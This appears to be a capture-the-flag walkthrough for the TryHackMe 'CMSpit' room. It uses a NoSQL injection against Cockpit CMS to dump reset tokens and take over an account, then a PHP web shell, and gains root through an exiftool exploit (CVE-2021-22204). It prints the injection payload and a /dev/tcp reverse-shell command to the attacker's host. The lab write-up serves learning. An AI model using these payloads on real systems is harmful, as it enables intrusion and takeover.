Room: https://tryhackme.com/room/cmspit

# RECONNAISSANCE

After we deployed the VM, we start with an NMAP and check the machine. Do a dirb search if it has a http port opened.  
```sudo nmap -v -sV -sC -Pn -T4 -p- -oG nmap.log 10.10.24.213```  
NMAP output:  
![image](https://user-images.githubusercontent.com/71237545/128411161-73299f6f-d68a-4308-81eb-f1d0d49fd926.png)  

From this we can check the port 80.  
Image from the port 80:  
![image](https://user-images.githubusercontent.com/71237545/128411192-81ec7504-828e-446a-b296-cbcb814b8363.png)  

After checking the source code I found the method to /auth/check and we execute dirb to this url.  
	```<form class="uk-form" method="post" action="/auth/check" onsubmit="{ submit }">```  
Dirb command:  
``` dirb http://10.10.24.213/auth/check/ /usr/share/wordlists/dirb/big.txt -f ```  
Dirb output:  
![image](https://user-images.githubusercontent.com/71237545/128411233-b7666e8e-d5c5-4572-8a32-f33e5c8dd83e.png)  

At this point we can answer the first 3 questions.  
After some research for the CMS cockpit with that version I found the following link.  
	https://swarm.ptsecurity.com/rce-cockpit-cms/  

From here, we open BurpSuite to analyze what we can find.  
From the site we take the following fuction to add to the request from our BurpSuite to check the answers.  

```{
"auth":{
	"user":{
		"$func":"var_dump"
		},
	"password":[
		0
		]
	},
"csfr":"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJjc2ZyIjoibG9naW4ifQ.dlnu8XjKIvB6mGfBlOgjtnixirAIsnzf5QTAEP1mJJc"} 
```
The output we get from this is the answer of the 4th question and reading through the site on the link we can answer the 5th one.  
With this we start playing around with the path of /auth/resetpassword and /auth/newpassword  
From here we can get the tokens when we use a dump on /resetpassword.  
With this token we can find the user information on /newpassword.  
With this information we can update and change the password of the user, having the reset token on /newpassword.  
And with this we are inside the CMS.  
![image](https://user-images.githubusercontent.com/71237545/128411370-a7e1400b-f592-473f-a320-cc433eeaef49.png)  

Navigating through the site we can find the Web flag.  
After this we have to upload and compromise the machine to get remote access or RCE.  

# Getting the reverse Shell  

After we create a php file with a simple shell we can execute commands on our machine.  

![image](https://user-images.githubusercontent.com/71237545/128411415-49919357-1ae4-4b23-899d-a0c0a6ef5581.png)

We make a reverse shell to upload and have our backdoor to the machine.  

Once we got in, we start checking thought the system and I I found the user.txt flag under /home/stux/  
Checking the files there and also checking the log from mongodb (/var/log/mongodb/mongodb.log) y can get the password of Stux  

With this we can get the Ssh password. And the db flag.  
Once we got this we can get in via SSH with the Stux account.  

![image](https://user-images.githubusercontent.com/71237545/128411453-e44ec792-d5a9-4102-b9b8-62cf2b924893.png)

# ESCALATION  

Here we can get the content of user.txt  
Now that we have the credentials of Stux, we can check any vulnerability to use on the system to escalate privileges. For this we will use Linpeas.  

With this and with sudo -l we can see the chance to use sudo on /usr/local/bin/exiftool  
With this, doing some research I foung the following CVE to use  
https://nvd.nist.gov/vuln/detail/CVE-2021-22204  
And this github to exploit  
https://github.com/bilkoh/POC-CVE-2021-22204  

Using this tool we create a jpg file and then include our payload there.

To use this I add the /bin/bash command on the payload.  
``` Perl image.perl "/bin/bash" ```  
Once this command is executed, a new file caleld notevil.jpg will appear. And now is time to use the sudo command.  
``` sudo /usr/local/bin/exiftool notevil.jpg ```  
If everything goes as it should, a bash shell will come up with the root user. After this is possible to execute either a remote shell or look for the last flag.  
I went for the reverse shell with just a basic reverse shell command.  
Let my port 8085 open with the next command  
	``` nc -lnvp 8085 ```  
And execute the following command on the machine:  
	``` sh-i >& /dev/tcp/10.6.36.7/80850>&1 ```  
With this we have root.  

![image](https://user-images.githubusercontent.com/71237545/128411500-b5cf2084-d6b3-4a67-81e6-ca6909fb572e.png)

And we can print the last flag.  

![image](https://user-images.githubusercontent.com/71237545/128411517-4fc61a75-bd2c-42e7-bd8f-01dedeeb9c88.png)
